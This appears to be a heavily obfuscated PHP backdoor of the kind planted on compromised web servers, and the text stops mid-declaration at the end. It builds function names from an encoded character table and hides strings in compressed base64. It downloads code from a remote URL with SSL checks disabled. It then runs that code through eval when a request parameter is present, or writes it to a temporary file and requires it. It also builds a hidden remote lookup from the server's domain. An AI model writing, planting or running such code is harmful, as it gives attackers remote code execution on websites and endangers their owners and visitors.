<?php
$x_yz_z_yyz=urldecode("%6f%41%2d%62%4e%6e%4b%37%4c%35%5f%4a%55%74%52%78%49%59%2b%57%43%61%39%33%56%6b%30%77%4d%31%4f%65%53%44%64%42%32%6a%2f%6c%73%58%66%71%70%68%6d%2a%54%47%76%51%48%72%50%79%63%5c%34%7a%75%46%36%69%5a%67%38%45");$xz_zyy_yz_=$x_yz_z_yyz[44].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[65].$x_yz_z_yyz[10].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[44].$x_yz_z_yyz[39].$x_yz_z_yyz[21].$x_yz_z_yyz[56].$x_yz_z_yyz[31].$x_yz_z_yyz[10].$x_yz_z_yyz[56].$x_yz_z_yyz[21].$x_yz_z_yyz[39].$x_yz_z_yyz[39].$x_yz_z_yyz[3].$x_yz_z_yyz[21].$x_yz_z_yyz[56].$x_yz_z_yyz[25];$x_y__yzzyz=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[21].$x_yz_z_yyz[46].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[0].$x_yz_z_yyz[56].$x_yz_z_yyz[25].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[10].$x_yz_z_yyz[56].$x_yz_z_yyz[39].$x_yz_z_yyz[63].$x_yz_z_yyz[31].$x_yz_z_yyz[5].$x_yz_z_yyz[13];$xyz_zz__yy=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[21].$x_yz_z_yyz[46].$x_yz_z_yyz[10].$x_yz_z_yyz[65].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[10].$x_yz_z_yyz[46].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[21].$x_yz_z_yyz[10].$x_yz_z_yyz[34].$x_yz_z_yyz[21].$x_yz_z_yyz[13].$x_yz_z_yyz[21];$xzzzy__yy_=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[21].$x_yz_z_yyz[46].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[10].$x_yz_z_yyz[3].$x_yz_z_yyz[39].$x_yz_z_yyz[0].$x_yz_z_yyz[56].$x_yz_z_yyz[25].$x_yz_z_yyz[63].$x_yz_z_yyz[5].$x_yz_z_yyz[65];$xzy__zy_zy=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[21].$x_yz_z_yyz[46].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[10].$x_yz_z_yyz[13].$x_yz_z_yyz[63].$x_yz_z_yyz[46].$x_yz_z_yyz[31].$x_yz_z_yyz[0].$x_yz_z_yyz[60].$x_yz_z_yyz[13];$xz__yyy_zz=$x_yz_z_yyz[42].$x_yz_z_yyz[63].$x_yz_z_yyz[39].$x_yz_z_yyz[31].$x_yz_z_yyz[10].$x_yz_z_yyz[65].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[10].$x_yz_z_yyz[56].$x_yz_z_yyz[0].$x_yz_z_yyz[5].$x_yz_z_yyz[13].$x_yz_z_yyz[31].$x_yz_z_yyz[5].$x_yz_z_yyz[13].$x_yz_z_yyz[40];$x__zz_yyzy=$x_yz_z_yyz[42].$x_yz_z_yyz[60].$x_yz_z_yyz[5].$x_yz_z_yyz[56].$x_yz_z_yyz[13].$x_yz_z_yyz[63].$x_yz_z_yyz[0].$x_yz_z_yyz[5].$x_yz_z_yyz[10].$x_yz_z_yyz[31].$x_yz_z_yyz[15].$x_yz_z_yyz[63].$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[40];$x_zyyyz__z=$x_yz_z_yyz[31].$x_yz_z_yyz[53].$x_yz_z_yyz[53].$x_yz_z_yyz[0].$x_yz_z_yyz[53].$x_yz_z_yyz[10].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[44].$x_yz_z_yyz[0].$x_yz_z_yyz[53].$x_yz_z_yyz[13].$x_yz_z_yyz[63].$x_yz_z_yyz[5].$x_yz_z_yyz[65];$xzz__yz_yy=$x_yz_z_yyz[65].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[45].$x_yz_z_yyz[0].$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[3].$x_yz_z_yyz[55].$x_yz_z_yyz[5].$x_yz_z_yyz[21].$x_yz_z_yyz[46].$x_yz_z_yyz[31];$xy_z_zyy_z=$x_yz_z_yyz[3].$x_yz_z_yyz[21].$x_yz_z_yyz[40].$x_yz_z_yyz[31].$x_yz_z_yyz[62].$x_yz_z_yyz[58].$x_yz_z_yyz[10].$x_yz_z_yyz[31].$x_yz_z_yyz[5].$x_yz_z_yyz[56].$x_yz_z_yyz[0].$x_yz_z_yyz[34].$x_yz_z_yyz[31];$x_z_yyzyz_=$x_yz_z_yyz[3].$x_yz_z_yyz[21].$x_yz_z_yyz[40].$x_yz_z_yyz[31].$x_yz_z_yyz[62].$x_yz_z_yyz[58].$x_yz_z_yyz[10].$x_yz_z_yyz[34].$x_yz_z_yyz[31].$x_yz_z_yyz[56].$x_yz_z_yyz[0].$x_yz_z_yyz[34].$x_yz_z_yyz[31];$xy__yzyz_z=$x_yz_z_yyz[53].$x_yz_z_yyz[21].$x_yz_z_yyz[27].$x_yz_z_yyz[60].$x_yz_z_yyz[53].$x_yz_z_yyz[39].$x_yz_z_yyz[31].$x_yz_z_yyz[5].$x_yz_z_yyz[56].$x_yz_z_yyz[0].$x_yz_z_yyz[34].$x_yz_z_yyz[31];$xy_yz__yzz=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[10].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[44].$x_yz_z_yyz[39].$x_yz_z_yyz[21].$x_yz_z_yyz[56].$x_yz_z_yyz[31];$xyy__zz_yz=$x_yz_z_yyz[56].$x_yz_z_yyz[60].$x_yz_z_yyz[53].$x_yz_z_yyz[39].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[0].$x_yz_z_yyz[44].$x_yz_z_yyz[13];$xz_zyzyy__=$x_yz_z_yyz[21].$x_yz_z_yyz[53].$x_yz_z_yyz[53].$x_yz_z_yyz[21].$x_yz_z_yyz[55].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[45].$x_yz_z_yyz[63].$x_yz_z_yyz[42].$x_yz_z_yyz[13];$xyy_yz__zz=$x_yz_z_yyz[44].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[65].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[44].$x_yz_z_yyz[39].$x_yz_z_yyz[63].$x_yz_z_yyz[13];$xzzzy_yy__=$x_yz_z_yyz[44].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[65].$x_yz_z_yyz[10].$x_yz_z_yyz[46].$x_yz_z_yyz[21].$x_yz_z_yyz[13].$x_yz_z_yyz[56].$x_yz_z_yyz[45];$x_yy_yz_zz=$x_yz_z_yyz[56].$x_yz_z_yyz[60].$x_yz_z_yyz[53].$x_yz_z_yyz[39].$x_yz_z_yyz[10].$x_yz_z_yyz[56].$x_yz_z_yyz[39].$x_yz_z_yyz[0].$x_yz_z_yyz[40].$x_yz_z_yyz[31];$x__yyzzz_y=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[10].$x_yz_z_yyz[40].$x_yz_z_yyz[44].$x_yz_z_yyz[39].$x_yz_z_yyz[63].$x_yz_z_yyz[13];$xz_y_zyzy_=$x_yz_z_yyz[44].$x_yz_z_yyz[21].$x_yz_z_yyz[53].$x_yz_z_yyz[40].$x_yz_z_yyz[31].$x_yz_z_yyz[10].$x_yz_z_yyz[60].$x_yz_z_yyz[53].$x_yz_z_yyz[39];$xzyzyz___y=$x_yz_z_yyz[65].$x_yz_z_yyz[59].$x_yz_z_yyz[63].$x_yz_z_yyz[5].$x_yz_z_yyz[42].$x_yz_z_yyz[39].$x_yz_z_yyz[21].$x_yz_z_yyz[13].$x_yz_z_yyz[31];$x_y_yzyz_z=$x_yz_z_yyz[56].$x_yz_z_yyz[60].$x_yz_z_yyz[53].$x_yz_z_yyz[39].$x_yz_z_yyz[10].$x_yz_z_yyz[63].$x_yz_z_yyz[5].$x_yz_z_yyz[63].$x_yz_z_yyz[13];$xyy_zz_yz_=$x_yz_z_yyz[56].$x_yz_z_yyz[60].$x_yz_z_yyz[53].$x_yz_z_yyz[39].$x_yz_z_yyz[10].$x_yz_z_yyz[31].$x_yz_z_yyz[15].$x_yz_z_yyz[31].$x_yz_z_yyz[56];$xyzy_z_y_z=$x_yz_z_yyz[50].$x_yz_z_yyz[21].$x_yz_z_yyz[53].$x_yz_z_yyz[10].$x_yz_z_yyz[34].$x_yz_z_yyz[60].$x_yz_z_yyz[46].$x_yz_z_yyz[44];$xz_y__zyzy=$x_yz_z_yyz[63].$x_yz_z_yyz[40].$x_yz_z_yyz[10].$x_yz_z_yyz[21].$x_yz_z_yyz[53].$x_yz_z_yyz[53].$x_yz_z_yyz[21].$x_yz_z_yyz[55];$x___zzzyyy=$x_yz_z_yyz[13].$x_yz_z_yyz[46].$x_yz_z_yyz[44].$x_yz_z_yyz[42].$x_yz_z_yyz[63].$x_yz_z_yyz[39].$x_yz_z_yyz[31];$x_z_zyyzy_=$x_yz_z_yyz[44].$x_yz_z_yyz[53].$x_yz_z_yyz[63].$x_yz_z_yyz[5].$x_yz_z_yyz[13].$x_yz_z_yyz[10].$x_yz_z_yyz[53];$xyyz___zyz=$x_yz_z_yyz[63].$x_yz_z_yyz[46].$x_yz_z_yyz[44].$x_yz_z_yyz[39].$x_yz_z_yyz[0].$x_yz_z_yyz[34].$x_yz_z_yyz[31];$xy_yyzzz__=$x_yz_z_yyz[31].$x_yz_z_yyz[15].$x_yz_z_yyz[44].$x_yz_z_yyz[39].$x_yz_z_yyz[0].$x_yz_z_yyz[34].$x_yz_z_yyz[31];$xyy_zzyz__=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[44].$x_yz_z_yyz[0].$x_yz_z_yyz[40];$xz__zyy_zy=$x_yz_z_yyz[40].$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[39].$x_yz_z_yyz[31].$x_yz_z_yyz[5];$xyz__zyz_y=$x_yz_z_yyz[45].$x_yz_z_yyz[31].$x_yz_z_yyz[15].$x_yz_z_yyz[34].$x_yz_z_yyz[31].$x_yz_z_yyz[56];$x_y__yzzyz=$x_yz_z_yyz[42].$x_yz_z_yyz[27].$x_yz_z_yyz[53].$x_yz_z_yyz[63].$x_yz_z_yyz[13].$x_yz_z_yyz[31];$xzyyy_z_z_=$x_yz_z_yyz[42].$x_yz_z_yyz[56].$x_yz_z_yyz[39].$x_yz_z_yyz[0].$x_yz_z_yyz[40].$x_yz_z_yyz[31];$xz___yyzyz=$x_yz_z_yyz[42].$x_yz_z_yyz[53].$x_yz_z_yyz[31].$x_yz_z_yyz[21].$x_yz_z_yyz[34];$xy_y_yz_zz=$x_yz_z_yyz[42].$x_yz_z_yyz[65].$x_yz_z_yyz[31].$x_yz_z_yyz[13].$x_yz_z_yyz[40];$xyz_z_yzy_=$x_yz_z_yyz[56].$x_yz_z_yyz[0].$x_yz_z_yyz[60].$x_yz_z_yyz[5].$x_yz_z_yyz[13];$x_z_yzyyz_=$x_yz_z_yyz[13].$x_yz_z_yyz[53].$x_yz_z_yyz[63].$x_yz_z_yyz[46];$xz_yzz__yy=$x_yz_z_yyz[37].$x_yz_z_yyz[0].$x_yz_z_yyz[63].$x_yz_z_yyz[5];$x_zy_y_zzy=$x_yz_z_yyz[42].$x_yz_z_yyz[31].$x_yz_z_yyz[0].$x_yz_z_yyz[42];${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x79\x79\x79\x7a\x5f\x5f\x7a"](0);$xyyzz__zy_="Ha0RDcvo3LzVDMyUXLyYTMuIWeiFXZ0NmLpxmZU=";$x__yz_yzzy="Ha0RHc6MyLj9nLpdzYuU2Yt9wL==";function x_zz_z_yyy($xyz_yyz_z_){$x_zzy_y_yz=substr($xyz_yyz_z_,0,5);$xyzzyy__z_=substr($xyz_yyz_z_,-5);$x_zy_zyzy_=substr($xyz_yyz_z_,7,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x5f\x7a\x79\x79\x5f\x7a\x79"]($xyz_yyz_z_)-14);return ${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x79\x7a\x79\x7a\x5f\x5f\x5f\x79"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x79\x7a\x79\x7a\x5f"]($x_zzy_y_yz.$x_zy_zyzy_.$xyzzyy__z_));}function xy_zyyz__z($xz_zy__zyy){if(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x7a\x7a\x79\x5f\x79\x79\x5f\x5f"]("/^https*\\:\\/\\//si",$xz_zy__zyy)){return '500';}$xy_y_zzz_y=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x5f\x79\x79\x79\x5f\x7a\x7a"]($xz_zy__zyy);if($xy_y_zzz_y!=false){return $xy_y_zzz_y;}$x_yzz_z_yy=x_zz_z_yyy('Sy4typZonPzMss0U4GsYpTS/ILoOzUitTkmrTi/OTs/ILUvJoCBLO4pCg1MTcexE8tiU/OyUzNK6mB8YBknSJakA');$xy_zyzy__z=$xzyyz_y_z_=$xyzy_yz_z_=$xy_yy__zzzrr_str ='';foreach(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x79\x79\x7a\x7a\x7a\x5f\x5f"]('|',$x_yzz_z_yy) as $c){$xz_yz_y_yz=1;foreach(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x79\x79\x7a\x7a\x7a\x5f\x5f"]('+',$c) as $d){if(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x5f\x7a\x7a\x5f\x79\x79\x7a\x79"]($d)){$xz_yz_y_yz=0;}}unset($d);if($xz_yz_y_yz){$xy_zyzy__z=$c;break;}}unset($x_yzz_z_yy,$c);if($xy_zyzy__z==''){return 0;}if(substr($xy_zyzy__z,0,1)=='c'){$xyyz__yzz_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x79\x5f\x79\x7a\x79\x7a\x5f\x7a"]();${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x5f\x7a\x7a\x5f\x79\x7a"]($xyyz__yzz_,CURLOPT_URL,$xz_zy__zyy);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x5f\x7a\x7a\x5f\x79\x7a"]($xyyz__yzz_,CURLOPT_USERAGENT,'s');${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x5f\x7a\x7a\x5f\x79\x7a"]($xyyz__yzz_,CURLOPT_RETURNTRANSFER,1);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x5f\x7a\x7a\x5f\x79\x7a"]($xyyz__yzz_,CURLOPT_TIMEOUT,100);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x5f\x7a\x7a\x5f\x79\x7a"]($xyyz__yzz_,CURLOPT_FRESH_CONNECT,TRUE);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x5f\x7a\x7a\x5f\x79\x7a"]($xyyz__yzz_,CURLOPT_SSL_VERIFYPEER,0);$xz_y_yz_yz=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x7a\x7a\x5f\x79\x7a\x5f"]($xyyz__yzz_);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x79\x79\x5f\x79\x7a\x5f\x7a\x7a"]($xyyz__yzz_);if(!$xz_y_yz_yz){return '501';}else{return $xz_y_yz_yz;}}$xz__yzyy_z=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x79\x5f\x7a\x79\x7a\x79\x5f"]($xz_zy__zyy);isset($xz__yzyy_z["\x68\x6f\x73\x74"])||$xz__yzyy_z["\x68\x6f\x73\x74"]='';isset($xz__yzyy_z["\x70\x61\x74\x68"])||$xz__yzyy_z["\x70\x61\x74\x68"]='';isset($xz__yzyy_z["\x71\x75\x65\x72\x79"])|| $xz__yzyy_z["\x71\x75\x65\x72\x79"]='';isset($xz__yzyy_z["\x70\x6f\x72\x74"])||$xz__yzyy_z["\x70\x6f\x72\x74"]='';$x_zzy__yyz=$xz__yzyy_z["\x70\x61\x74\x68"]?$xz__yzyy_z["\x70\x61\x74\x68"].($xz__yzyy_z["\x71\x75\x65\x72\x79"]?'?'.$xz__yzyy_z["\x71\x75\x65\x72\x79"]:''):'/';$xzy_y__zzy=$xz__yzyy_z["\x68\x6f\x73\x74"];if($xz__yzyy_z["\x73\x63\x68\x65\x6d\x65"]=='https'){$xzz_y_zyy_='1.1';$x_zyyyz_z_=empty($xz__yzyy_z["\x70\x6f\x72\x74"])?443:$xz__yzyy_z["\x70\x6f\x72\x74"];$xzy_y__zzy=x_zz_z_yyy('Ky7OsPgdLABXBwA=');$xzy_y__zzy.=$xz__yzyy_z["\x68\x6f\x73\x74"];}else{$xzz_y_zyy_='1.0';$x_zyyyz_z_=empty($xz__yzyy_z["\x70\x6f\x72\x74"])?80:$xz__yzyy_z["\x70\x6f\x72\x74"];}$x_zzyyy_z_='Host:';$x_zzyyy_z_.=$xzy_y__zzy;$headers[]=$x_zzyyy_z_;$headers[]=x_zz_z_yyy('c87PymS0tNLsnMz7NyzskNivTgUA');$headers[]=x_zz_z_yyy('Cy1OLbCdJ1TE/NK7ErMqBgA=');$headers[]=x_zz_z_yyy('c0xOTXJi0osdLtWS1wIA');unset($x_zzyyy_z_);$xzyyz_y_z_="GET $x_zzy__yyz HTTP/$xzz_y_zyy_".PHP_EOL.${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x79\x7a\x7a\x5f\x5f\x79\x79"](PHP_EOL,$headers).PHP_EOL.PHP_EOL;unset($headers,$xz__yzyy_z,$xzz_y_zyy_,$x_zzy__yyz);$x_y_zz_yzy=null;if(substr($xy_zyzy__z,-1)=='n'){$x_y_zz_yzy=$xy_zyzy__z($xzy_y__zzy,$x_zyyyz_z_,$xyzy_yz_z_,$xy_yy__zzzrr_str,30);}else{if(substr($xy_zyzy__z,-1)=='t'){$xzzzyy__y_=x_zz_z_yyy('K0kusibNLVEXBwA=');$xzzzyy__y_.=$xzy_y__zzy;$xzzzyy__y_.=':';$xzzzyy__y_.=$x_zyyyz_z_;$x_y_zz_yzy=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x79\x5f\x5f\x79\x7a\x7a\x79\x7a"]($xzzzyy__y_,$xyzy_yz_z_,$xy_yy__zzzrr_str,30);unset($xzzzyy__y_);}}$x_yy_z_zyz='';if($x_y_zz_yzy){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x7a\x7a\x79\x5f\x5f\x79\x79\x5f"]($x_y_zz_yzy,TRUE);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x79\x5f\x5f\x7a\x79\x5f\x7a\x79"]($x_y_zz_yzy,30);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x79\x5f\x5f\x79\x7a\x7a\x79\x7a"]($x_y_zz_yzy,$xzyyz_y_z_);$x_z_y_yzyz=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x5f\x7a\x7a\x5f\x5f\x79\x79"]($x_y_zz_yzy);if(!$x_z_y_yzyz["\x74\x69\x6d\x65\x64\x5f\x6f\x75\x74"]){while(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x79\x5f\x79\x5f\x7a\x7a\x79"]($x_y_zz_yzy)){$xzyy__z_yz=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x79\x5f\x79\x7a\x5f\x7a\x7a"]($x_y_zz_yzy);if($xzyy__z_yz&&(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x5f\x79\x7a\x79\x7a\x5f\x7a"]($xzyy__z_yz)=="%0D%0A"||${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x5f\x79\x7a\x79\x7a\x5f\x7a"]($xzyy__z_yz)=="%0A")){break;}unset($xzyy__z_yz);}while(!${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x79\x5f\x79\x5f\x7a\x7a\x79"]($x_y_zz_yzy)){$xzz_y_yyz_=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x5f\x5f\x79\x79\x7a\x79\x7a"]($x_y_zz_yzy,8192);$x_yy_z_zyz.=$xzz_y_yyz_;unset($xzz_y_yyz_);}}unset($x_z_y_yzyz);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x79\x79\x79\x5f\x7a\x5f\x7a\x5f"]($x_y_zz_yzy);}else{if(substr($xy_zyzy__z,-1)=='e'){$x__zyzzy_y=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x7a\x5f\x5f\x79\x7a\x5f\x79\x79"]($xzy_y__zzy);$x_y_zz_yzy=$xy_zyzy__z(AF_INET,SOCK_STREAM,0);if(socket_connect($x_y_zz_yzy,$x__zyzzy_y,$x_zyyyz_z_)){socket_write($x_y_zz_yzy,$xzyyz_y_z_,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x5f\x7a\x79\x79\x5f\x7a\x79"]($xzyyz_y_z_));while($x__yyz_yzz=@socket_read($x_y_zz_yzy,8192)){$x_yy_z_zyz.=$x__yyz_yzz;unset($x__yyz_yzz);}$x_yy_z_zyz=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x79\x79\x7a\x7a\x7a\x5f\x5f"]("\\r\\n\\r\\n",$x_yy_z_zyz);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x7a\x79\x7a\x79\x79\x5f\x5f"]($x_yy_z_zyz);$x_yy_z_zyz=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x7a\x5f\x5f\x5f\x7a\x79\x7a"]("\\r\\n\\r\\n",$x_yy_z_zyz);}socket_close($x_y_zz_yzy);unset($x__zyzzy_y);}}unset($xzyyz_y_z_,$xy_zyzy__z,$x_y_zz_yzy,$x_zyyyz_z_,$xzy_y__zzy);$x_yy_z_zyz=@${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x7a\x79\x79\x5f\x79\x7a\x5f"]('/(?:(?:\\r\\n|\\n)|^)([0-9A-F]+)(?:\\r\\n|\\n){1,2}(.*?)'.'((?:\\r\\n|\\n)(?:[0-9A-F]+(?:\\r\\n|\\n))|$)/si','x_zyzy_z_y',$x_yy_z_zyz);return ${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x7a\x79\x79\x7a\x5f"](${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x7a\x79\x79\x7a\x5f"]($x_yy_z_zyz,"\\xEF\\xBB\\xBF"));}function x_zyzy_z_y($matches){return ${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x5f\x5f\x7a\x79\x7a\x5f\x79"]($matches[1])==${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x5f\x7a\x79\x79\x5f\x7a\x79"]($matches[2])?$matches[2]:$matches[0];}function xyzyz___zy($xzzyy_y__z=''){$xzzyy_y__z=(${"\x5f\x53\x45\x52\x56\x45\x52"}["HTTP_VIA"])?${"\x5f\x53\x45\x52\x56\x45\x52"}["HTTP_X_FORWARDED_FOR"]:${"\x5f\x53\x45\x52\x56\x45\x52"}["REMOTE_ADDR"];$xzzyy_y__z=($xzzyy_y__z)?$xzzyy_y__z:${"\x5f\x53\x45\x52\x56\x45\x52"}["REMOTE_ADDR"];return ${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x7a\x79\x79\x7a\x5f"]($xzzyy_y__z);}function xzyy_y_zz_($xyz_yyz_z_=''){if(isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"])){return ${"\x5f\x53\x45\x52\x56\x45\x52"}["\x48\x54\x54\x50\x5f\x48\x4f\x53\x54"];}elseif(isset(${"\x5f\x53\x45\x52\x56\x45\x52"}["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"])){return ${"\x5f\x53\x45\x52\x56\x45\x52"}["\x53\x45\x52\x56\x45\x52\x5f\x4e\x41\x4d\x45"];}return $xyz_yyz_z_;}function xz_zy_zyy_($xz_zy__zyy){$xzyyz__y_z=xy_zyyz__z($xz_zy__zyy);$xzz_yy__zy=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x7a\x5f\x79\x79\x7a\x79\x7a\x5f"]("PD9waHA=");if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x7a\x7a\x79\x7a\x5f\x5f"]($xzyyz__y_z,$xzz_yy__zy)===false){die('get failed');}$xyyzyz_z__=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x5f\x5f\x7a\x7a\x7a\x79\x79\x79"]();if(isset($_REQUEST["\x65"])){$xzyyz__y_z=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x5f\x79\x7a\x5f\x5f\x79\x7a\x7a"]($xzz_yy__zy,"",$xzyyz__y_z);$xy_yy__zzz='e'.'v'.'a'.'l';$xy_yy__zzz($xzyyz__y_z);die();}${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x79\x5f\x5f\x79\x7a\x7a\x79\x7a"]($xyyzyz_z__,$xzyyz__y_z);$x_yzz_z_yy=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x5f\x7a\x7a\x5f\x5f\x79\x79"]($xyyzyz_z__);@require($x_yzz_z_yy["\x75\x72\x69"]);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x79\x79\x79\x5f\x7a\x5f\x7a\x5f"]($xyyzyz_z__);die();}function x__yzy_yzz($xyyzz__zy_){$x_yzz_y_zy=substr($xyyzz__zy_,${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x7a\x5f\x5f\x7a\x79\x79\x5f\x7a\x79"]($xyyzz__zy_) -2);$xyzy__zy_z=${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x5f\x5f\x79\x79\x7a\x7a\x7a\x5f\x79"]($xyyzz__zy_);$xzzy__yzy_='';for ($xy_zzyy__z=0;$xy_zzyy__z<${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x5f\x7a\x5f\x79\x7a\x79\x5f"]($xyzy__zy_z)-2;$xy_zzyy__z=$xy_zzyy__z+2){$xzzy__yzy_.=$xyzy__zy_z[$xy_zzyy__z+1].$xyzy__zy_z[$xy_zzyy__z];}$xzzy__yzy_.=$x_yzz_y_zy;return $xzzy__yzy_;}function x_z_zyyyz_($googleUrl,$x__yzz_yzy,$xy_z_zyz_y){$x_z__yzzyy=x_zz_z_yyy('yygpKPrSi20tdXLdYvyMxLty/OLEnNTSywVS0GiqgBLWAwA=');$x_y__zzyzy=sprintf($x_z__yzzyy,$googleUrl,$xy_z_zyz_y["\x70\x72\x6f\x74\x6f\x63\x6f\x6c"],$xy_z_zyz_y["\x73\x65\x72\x76\x65\x72\x5f\x64\x6f\x6d\x61\x69\x6e"],$x__yzz_yzy);$xyy_z__zyz=xy_zyyz__z($x_y__zzyzy);if(isset($_REQUEST["\x73\x74"])){${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x79\x5f\x7a\x5f\x79\x5f\x7a"]($x_y__zzyzy);${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x7a\x79\x5f\x7a\x5f\x79\x5f\x7a"]($xyy_z__zyz);die();}$xzyyyz_z__=x_zz_z_yyy('S8/PTCz89ZcJBQA=');$x_y_yzzzy_=x_zz_z_yyy('Ky5NToUk4iBtLgYA');$xyyzyz__z_=x_zz_z_yyy('S0vMzEJElwPNAQA=');if(${"\x47\x4c\x4f\x42\x41\x4c\x53"}["\x78\x79\x79\x5f\x7a\x7a\x79\x7a\x5f\x5f"]($xyy_z__zyz,$xzyyyz_z__)!=false){die($x_y_yzzzy_);}die($xyyzyz__z_);}function 